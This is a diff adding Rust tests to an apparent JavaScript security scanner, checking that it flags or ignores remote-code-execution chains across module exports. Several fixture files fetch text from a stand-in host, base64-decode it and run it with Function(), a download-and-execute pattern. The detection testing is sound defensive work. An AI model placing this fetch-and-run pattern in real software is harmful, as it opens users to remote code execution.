@@ -539,6 +539,101 @@ fn commonjs_wrapper_preserves_remote_data_across_files() {
 }
 
 #[test]
+fn private_commonjs_helper_is_not_treated_as_exported() {
+    let root = temporary_directory("private-helper");
+    fs::write(
+        root.join("decode.js"),
+        b"function unpack(x) { return x; } module.exports = {};",
+    )
+    .unwrap();
+    fs::write(root.join("main.js"), b"const helper = require('./decode.js'); async function boot() { const response = await fetch('https://example.invalid/x'); Function(helper.unpack(await response.text()))(); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn esm_export_alias_is_traced_but_private_helper_is_not() {
+    let root = temporary_directory("esm-exports");
+    fs::write(root.join("decode.js"), b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } function privateHelper(x) { return x; } export { unpack as decode };").unwrap();
+    fs::write(root.join("main.js"), b"import { decode, privateHelper } from './decode.js'; async function boot() { const response = await fetch('https://example.invalid/x');\nFunction(decode(await response.text()))();\nFunction(privateHelper(await response.text()))(); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let chains: Vec<_> = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect();
+    assert_eq!(chains.len(), 1);
+    assert!(chains[0]["evidence"].to_string().contains("decode.js"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn esm_reexport_preserves_remote_data_across_modules() {
+    let root = temporary_directory("esm-reexport");
+    fs::write(
+        root.join("api.js"),
+        b"export function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
+    )
+    .unwrap();
+    fs::write(
+        root.join("bridge.js"),
+        b"export { unpack as decode } from './api.js';",
+    )
+    .unwrap();
+    fs::write(root.join("main.js"), b"import { decode } from './bridge.js'; async function boot() { const response = await fetch('https://example.invalid/x'); Function(decode(await response.text()))(); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("api.js"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn default_exported_function_preserves_remote_data() {
+    let root = temporary_directory("default-export");
+    fs::write(
+        root.join("decode.js"),
+        b"export default function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
+    )
+    .unwrap();
+    fs::write(root.join("main.js"), b"import unpack from './decode.js'; async function boot() { const response = await fetch('https://example.invalid/x'); Function(unpack(await response.text()))(); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn static_eval_does_not_form_remote_execution_chain() {
     let root = temporary_directory("static-eval");
     fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();
